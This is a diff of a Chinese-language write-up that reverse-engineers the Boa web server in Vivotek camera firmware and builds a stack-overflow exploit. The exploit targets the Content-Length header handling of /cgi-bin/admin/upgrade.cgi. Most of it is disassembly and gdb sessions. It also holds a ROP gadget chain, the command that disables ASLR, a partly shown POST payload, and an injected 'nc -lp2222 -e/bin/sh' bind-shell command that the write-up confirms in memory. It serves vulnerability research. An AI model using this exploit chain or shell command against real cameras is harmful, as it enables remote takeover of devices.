@@ -88,61 +88,35 @@ excerpt:
 ![image.png](<https://ws1.sinaimg.cn/large/7fb67c86ly1g6oqf2leqbj20so09n0wf.jpg>)
 
 	.text:00010AC8 STMFD SP!, {R4,R5,LR}
-
 	.text:00010ACC SUB SP, SP, #0x6C
-
 	.text:00010AD0 BL getuid
-
 	.text:00010AD4 LDR R2, =dword_37E88
-
 	.text:00010AD8 LDR R1, =dword_34874
-
 	.text:00010ADC LDR R3, [R2]
-
 	.text:00010AE0 CMP R3, #0
-
 	.text:00010AE4 LDREQ R3, =aEtcConfDBoaBoa ; "/etc/conf.d/boa/boa.conf"
-
 	.text:00010AE8 STREQ R3, [R2]
-
 	.text:00010AEC STR R0, [R1]
-
 	.text:00010AF0 MOV R0, R3 ; filename
-
 	.text:00010AF4 LDR R1, =(aChdir_0+4) ; modes
-
 	.text:00010AF8 BL fopen
-
 	.text:00010AFC SUBS R5, R0, #0
-
 	.text:00010B00 BEQ loc_10CA4
-
 	.......
-
 	.......
-
 	.text:00010CA4 loc_10CA4 ; CODE XREF: sub_10AC8+38↑j
-
 	.text:00010CA4 LDR R3, =stderr
-
 	.text:00010CA8 LDR R0, =aCouldNotOpenBo ; "Could not open boa.conf for reading.n"
-
 	.text:00010CAC LDR R3, [R3] ; s
-
 	.text:00010CB0 MOV R1, #1 ; size
-
 	.text:00010CB4 MOV R2, #0x25 ; n
-
 	.text:00010CB8 BL fwrite
-
 	.text:00010CBC MOV R0, #1 ; status
-
 	.text:00010CC0 BL exit
 
 整段的意思就是打开/etc/conf.d/boa/boa.conf这个文件失败所以输出错误。我们找到这个文件，但发现/etc/conf.d是一个普通文本，而不是一个文件夹。用ls -l命令发现这个文件是指向./mnt/flash/etc/conf.d，但链接断了。
 
 	root@tearorca:~/f/测试/摄像头/_CC8160-VVTK-0100d.flash.pkg.extracted/_31.extracted/_rootfs.img.extracted/squashfs-root/etc# ls -l conf.d
-
 	lrwxrwxrwx 1 root root 23 12月 6 2016 conf.d -> ../mnt/flash/etc/conf.d
 
 再到/mnt/flash/etc里面找发现里面根本就没有conf.d这个文件夹。在文件系统里面搜索该配置文件，在./_31.extracted/defconf/_CC8160.tar.bz2.extracted/_0.extracted/etc/conf.d/boa/boa.conf找到，把该/etc目录拷到../mnt/flash/目录下面，选择全部覆盖。
@@ -158,66 +132,36 @@ excerpt:
 ![image.png](<https://ws1.sinaimg.cn/large/7fb67c86ly1g6oqfw2kz2j20sv0b4jvi.jpg>)
 
 	.text:00010C10 loc_10C10 ; CODE XREF: sub_10AC8+58↑j
-
 	.text:00010C10 ADD R0, SP, #0x78+rlimits ; name
-
 	.text:00010C14 MOV R1, #0x64 ; len
-
 	.text:00010C18 BL gethostname
-
 	.text:00010C1C CMN R0, #1
-
 	.text:00010C20 BEQ loc_10D14
-
 	.text:00010C24 ADD R0, SP, #0x78+rlimits ; name
-
 	.text:00010C28 BL gethostbyname
-
 	.text:00010C2C CMP R0, #0
-
 	.text:00010C30 BEQ loc_10D04
-
 	.text:00010C34 LDR R0, [R0] ; s
-
 	.text:00010C38 BL strdup
-
 	.text:00010C3C CMP R0, #0
-
 	.text:00010C40 STR R0, [R4]
-
 	.text:00010C44 BNE loc_10B24
-
 	.text:00010C48 LDR R0, =aStrdup_0 ; "strdup:"
-
 	.text:00010C4C BL perror
-
 	.text:00010C50 MOV R0, #1 ; status
-
 	.text:00010C54 BL exit
-
 	.text:00010D04 loc_10D04 ; CODE XREF: sub_10AC8+168↑j
-
 	.text:00010D04 LDR R0, =aGethostbyname_0 ; "gethostbyname:"
-
 	.text:00010D08 BL perror
-
 	.text:00010D0C MOV R0, #1 ; status
-
 	.text:00010D10 BL exit
-
 	.text:00010D14 ;
 	---------------------------------------------------------------------------
-
 	.text:00010D14
-
 	.text:00010D14 loc_10D14 ; CODE XREF: sub_10AC8+158↑j
-
 	.text:00010D14 LDR R0, =aGethostname_0 ; "gethostname:"
-
 	.text:00010D18 BL perror
-
 	.text:00010D1C MOV R0, #1 ; status
-
 	.text:00010D20 BL exit
 
 gethostbyname函数是用来获取主机名称的，上面一段的意思应该是通过比较虚拟机和宿主机的名称是否相同，不相同则输出错误。可以用hostname命令来查看主机名称。
@@ -250,83 +194,48 @@ hostname <名称>进行暂时修改主机名称。
 ![image.png](<https://ws1.sinaimg.cn/large/7fb67c86ly1g6oqh0sfe9j20qh0av42g.jpg>)
 
 	.text:00018504 loc_18504 ; CODE XREF: sub_17F80+1B8↑j
-
 	.text:00018504 LDR R0, [SP,#0x50+haystack] ; haystack
-
 	.text:00018508 LDR R1, =aContentLength_0 ; "Content-Length"
-
 	.text:0001850C BL strstr
-
 	.text:00018510 MOV R1, #0xA ; c
-
 	.text:00018514 MOV R7, R0
-
 	.text:00018518 BL strchr
-
 	.text:0001851C MOV R1, #0x3A ; c
-
 	.text:00018520 MOV R6, R0
-
 	.text:00018524 MOV R0, R7 ; s
-
 	.text:00018528 BL strchr
-
 	.text:0001852C ADD R1, R0, #1 ; src
-
 	.text:00018530 RSB R2, R1, R6
-
 	.text:00018534 ADD R0, SP, #0x50+dest ; dest
-
 	.text:00018538 BL strncpy
-
 	.text:0001853C B loc_1813C
 
 这段先是调用了strstr函数判断=aContentLength_0 是否为haystack的子集，如果是则返回子集开始的首地址作为R0。然后后面两个strchr寻找子集中0xA(“n”)和0x3A(“:”)的位置。最后调用strncpy复制，复制的长度为R6-R1（RSB命令是逆向减法指令，用于把操作数2减去操作数1）。这里的R6和R1其实都是可控的，只要让他们两个的长度超过栈空间的长度就会导致溢出。
 
 	.text:00017F80 sub_17F80 ; CODE XREF: sub_19D7C+220↓p
-
 	.text:00017F80
-
 	.text:00017F80 var_50 = -0x50
-
 	.text:00017F80 var_4C = -0x4C
-
 	.text:00017F80 haystack = -0x44
-
 	.text:00017F80 var_40 = -0x40
-
 	.text:00017F80 var_3C = -0x3C
-
 	.text:00017F80 dest = -0x38
-
 	.text:00017F80 var_34 = -0x34
-
 	.text:00017F80 var_30 = -0x30
-
 	.text:00017F80 var_2C = -0x2C
-
 	.text:00017F80
-
 	.text:00017F80 ADD R3, R0, #0x3540
-
 	.text:00017F84 STMFD SP!, {R4-R11,LR}
-
 	.text:00017F88 ADD R3, R3, #0x3A
 
 这是这个函数最前面初始化环境的位置。复制的目标地址在-0x38的位置，然后是用 STMFD SP!, {R4-R11,LR}把返回地址以及几个参数压入栈中。
 
 	STMFD SP！，{R4-R11，LR} 的伪代码如下：
-
 	SP ＝ SP － 9×4；
-
 	address = SP;
-
 	for i = 4 to 11
-
 		Memory[address] = Ri;
-
 		address = address + 4;
-
 	Memory[address] = LR;
 
 从上面的代码可以分析出，这个函数开辟的栈空间大小为0x50。dest的-0x38实际上应该是bp+0x50-0x38=bp+0x18上面的代码sp已经回到了bp的位置，所以也就是sp+0x18
@@ -360,7 +269,6 @@ hostname <名称>进行暂时修改主机名称。
 最后选了这两条指令。
 
 	0x00048784 : pop {r1, pc}
-
 	0x00016aa4 : mov r0, r1 ; pop {r4, r5, pc}
 
 为了调试方便，关闭了aslr。echo 0 > /proc/sys/kernel/randomize_va_space
@@ -372,215 +280,114 @@ hostname <名称>进行暂时修改主机名称。
 具体的用法如下，1234是监听的端口，2656是httpd的进程号。
 
 	/ # httpd
-
 	sendto() error 2
-
 	[debug]add server push uri 3 video3.mjpg
-
 	[debug]add server push uri 4 video4.mjpg
-
 	[debug] after ini, server_push_uri[0] is /video3.mjpg
-
 	[debug] after ini, server_push_uri[1] is /video4.mjpg
-
 	/ # [05/Sep/2019:07:14:50 +0000] boa: server version 1.32.1.10(Boa/0.94.14rc21)
-
 	[05/Sep/2019:07:14:50 +0000] boa: starting server pid=2656, port 80
-
 	/ # ./gdbserver-7.7.1-armhf-eabi5-v1-sysv :1234 --attach 2656
-
 	Attached; pid = 2656
-
 	Listening on port 1234
-
 	Remote debugging from host 10.10.10.1
 
 然后在宿主机运行arm-linux-gdb连接之后就可以进行调试了，命令和普通的gdb是一样的
 
 	root@tearorca:~/f/测试/摄像头/_CC8160-VVTK-0100d.flash.pkg.extracted/_31.extracted/_rootfs.img.extracted/squashfs-root# arm-linux-gdb ./httpd
-
 	GNU gdb (GDB) 8.3
-
 	Copyright (C) 2019 Free Software Foundation, Inc.
-
 	License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
-
 	This is free software: you are free to change and redistribute it.
-
 	There is NO WARRANTY, to the extent permitted by law.
-
 	Type "show copying" and "show warranty" for details.
-
 	This GDB was configured as "--host=x86_64-pc-linux-gnu --target=arm-linux".
-
 	Type "show configuration" for configuration details.
-
 	For bug reporting instructions, please see:
-
 	<http://www.gnu.org/software/gdb/bugs/>.
-
 	Find the GDB manual and other documentation resources online at:
-
 	<http://www.gnu.org/software/gdb/documentation/>.
-
 	For help, type "help".
-
 	Type "apropos word" to search for commands related to "word"...
-
 	Reading symbols from ./httpd...
-
 	(No debugging symbols found in ./httpd)
-
 	gdb-peda$ target remote 10.10.10.2:1234
-
 	Remote debugging using 10.10.10.2:1234
-
 	Reading /usr/lib/libxmlsparser.so.1 from remote target...
-
 	warning: File transfers from remote targets can be slow. Use "set sysroot" to access files locally instead.
-
 	Reading /usr/lib/libaccount.so.1 from remote target...
-
 	Reading /usr/lib/libmessage.so.1 from remote target...
-
 	Reading /usr/lib/libexpat.so.1 from remote target...
-
 	Reading /lib/libcrypt.so.0 from remote target...
-
 	Reading /lib/libc.so.0 from remote target...
-
 	Reading /lib/libgcc_s.so.1 from remote target...
-
 	Reading /lib/ld-uClibc.so.0 from remote target...
-
 	Reading symbols from target:/usr/lib/libxmlsparser.so.1...
-
 	(No debugging symbols found in target:/usr/lib/libxmlsparser.so.1)
-
 	Reading symbols from target:/usr/lib/libaccount.so.1...
-
 	(No debugging symbols found in target:/usr/lib/libaccount.so.1)
-
 	Reading symbols from target:/usr/lib/libmessage.so.1...
-
 	(No debugging symbols found in target:/usr/lib/libmessage.so.1)
-
 	Reading symbols from target:/usr/lib/libexpat.so.1...
-
 	(No debugging symbols found in target:/usr/lib/libexpat.so.1)
-
 	Reading symbols from target:/lib/libcrypt.so.0...
-
 	(No debugging symbols found in target:/lib/libcrypt.so.0)
-
 	Reading symbols from target:/lib/libc.so.0...
-
 	(No debugging symbols found in target:/lib/libc.so.0)
-
 	Reading symbols from target:/lib/libgcc_s.so.1...
-
 	(No debugging symbols found in target:/lib/libgcc_s.so.1)
-
 	Reading symbols from target:/lib/ld-uClibc.so.0...
-
 	(No debugging symbols found in target:/lib/ld-uClibc.so.0)
-
 	Reading /lib/ld-uClibc.so.0 from remote target...
-
 	Python Exception <type 'exceptions.AttributeError'> 'module' object has no attribute 'objfiles':
-
 	0x76f3ac5c in select () from target:/lib/libc.so.0
-
 	gdb-peda$
 
 直接c运行，在另一个窗口向端口发送poc，查看一下崩溃时候的栈环境。
 
 	gdb-peda$ c
-
 	Continuing.
-
 	Program received signal SIGSEGV, Segmentation fault.
-
 	Python Exception <type 'exceptions.AttributeError'> 'module' object has no attribute 'objfiles':
-
 	0x58585858 in ?? ()
-
 	gdb-peda$ i reg
-
 	r0 0x1 0x1
-
 	r1 0x46058 0x46058
-
 	r2 0x0 0x0
-
 	r3 0x75 0x75
-
 	r4 0x42424242 0x42424242
-
 	r5 0x43434343 0x43434343
-
 	r6 0x44444444 0x44444444
-
 	r7 0x45454545 0x45454545
-
 	r8 0x46464646 0x46464646
-
 	r9 0x47474747 0x47474747
-
 	r10 0x48484848 0x48484848
-
 	r11 0x49494949 0x49494949
-
 	r12 0x1 0x1
-
 	sp 0x7effeb80 0x7effeb80
-
 	lr 0x18474 0x18474
-
 	pc 0x58585858 0x58585858
-
 	cpsr 0x60000010 0x60000010
-
 	fpscr 0x0 0x0
-
 	gdb-peda$ x/64 0x7effeb80
-
 	0x7effeb80: 0x726e726e 0x0 0x4 0x37e6c
-
 	0x7effeb90: 0x37dd8 0x36b00 0x31928 0x37e88
-
 	0x7effeba0: 0x37e5c 0x1cd58 0x7effebcc 0x7472
-
 	0x7effebb0: 0x3 0x4 0x0 0x3
-
 	0x7effebc0: 0x0 0x4 0x0 0x9
-
 	0x7effebd0: 0x448a2 0x0 0x0 0x0
-
 	0x7effebe0: 0x0 0x0 0x0 0x0
-
 	0x7effebf0: 0x0 0x0 0x0 0x0
-
 	0x7effec00: 0x6f6f722f 0x65732f74 0x69727563 0x722f7974
-
 	0x7effec10: 0x72656665 0x522f7265 0x63784563 0x69747065
-
 	0x7effec20: 0x6f486e6f 0x692f7473 0x616e2f32 0x656d
-
 	0x7effec30: 0x0 0x0 0x0 0x0
-
 	0x7effec40: 0x0 0x0 0x0 0x0
-
 	0x7effec50: 0x0 0x0 0x0 0x0
-
 	0x7effec60: 0x0 0x0 0x0 0x0
-
 	0x7effec70: 0x0 0x0 0x0 0x0
-
 	gdb-peda$ x/64s 0x7effeb80
-
 	0x7effeb80: "nrnr"
-
 	0x7effeb85: ""
 
 可以看到崩溃时候的pc值为0x58585858也就是”XXXX”，sp为0x7effeb80，而这个栈空间的值正好是poc中最胡的nrnr，所以我们只要把需要执行的命令放在最后然后把其所在的栈空间存到R0被system调用即可。
@@ -605,97 +412,53 @@ payload：echo -en "POST /cgi-bin/admin/upgrade.cgi HTTP/1.0nContent-Length:aaaa
 用gdbserver来调试一下看看过程。把断点下在返回地址的位置，0x18398。
 
 	.text:00018394 ADD SP, SP, #0x2C
-
 	.text:00018398 LDMFD SP!, {R4-R11,PC}
 
 运行查看当前栈环境。
 
 	gdb-peda$ b *0x18398
-
 	Breakpoint 1 at 0x18398
-
 	gdb-peda$ c
-
 	Continuing.
-
 	Python Exception <type 'exceptions.AttributeError'> 'module' object has no attribute 'objfiles':
-
 	Breakpoint 1, 0x00018398 in ?? ()
-
 	gdb-peda$ i reg
-
 	r0 0x1 0x1
-
 	r1 0x46058 0x46058
-
 	r2 0x0 0x0
-
 	r3 0x9f 0x9f
-
 	r4 0x45058 0x45058
-
 	r5 0x9f 0x9f
-
 	r6 0x4c058 0x4c058
-
 	r7 0x485d2 0x485d2
-
 	r8 0x485d1 0x485d1
-
 	r9 0x485d2 0x485d2
-
 	r10 0x323a0 0x323a0
-
 	r11 0x0 0x0
-
 	r12 0x1 0x1
-
 	sp 0x7effeb5c 0x7effeb5c
-
 	lr 0x18474 0x18474
-
 	pc 0x18398 0x18398
-
 	cpsr 0x60000010 0x60000010
-
 	fpscr 0x0 0x0
-
 	gdb-peda$ x/64 0x7effeb5c
-
 	0x7effeb5c: 0x61616161 0x61616161 0x61616161 0x61616161
-
 	0x7effeb6c: 0x61616161 0x61616161 0x61616161 0x61616161
-
 	0x7effeb7c: 0x76f75784 0x7effeb94 0x76f43aa4 0x61616161
-
 	0x7effeb8c: 0x61616161 0x76f74ab0 0x2d20636e 0x3232706c
-
 	0x7effeb9c: 0x2d203232 0x69622f65 0x68732f6e 0x7eff3e20
-
 	0x7effebac: 0x7472 0x3 0x4 0x0
-
 	0x7effebbc: 0x3 0x0 0x4 0x0
-
 	0x7effebcc: 0x2 0x3e4e2 0x0 0x0
-
 	0x7effebdc: 0x0 0x0 0x0 0x0
-
 	0x7effebec: 0x0 0x0 0x0 0x0
-
 	0x7effebfc: 0x0 0x6f6f722f 0x65732f74 0x69727563
-
 	0x7effec0c: 0x722f7974 0x72656665 0x522f7265 0x63784563
-
 	0x7effec1c: 0x69747065 0x6f486e6f 0x692f7473 0x616e2f32
-
 	0x7effec2c: 0x656d 0x0 0x0 0x0
-
 	0x7effec3c: 0x0 0x0 0x0 0x0
-
 	0x7effec4c: 0x0 0x0 0x0 0x0
-
 	gdb-peda$ x/s 0x7effeb94
-
 	0x7effeb94: "nc -lp2222 -e/bin/sh >377~rt"
 
 可以看到0x76f75784是pop的地址，它会将0x7effeb94给R1，0x76f43aa4给PC，而0x76f43aa4是mov的地址，将R1给R0，接着将8个a给R4和R5,最后把system地址给PC完成调用。同时可以看到它的参数也就是0x7effeb94已经被覆盖为目标命令，直接调用就可以反弹一个shell。
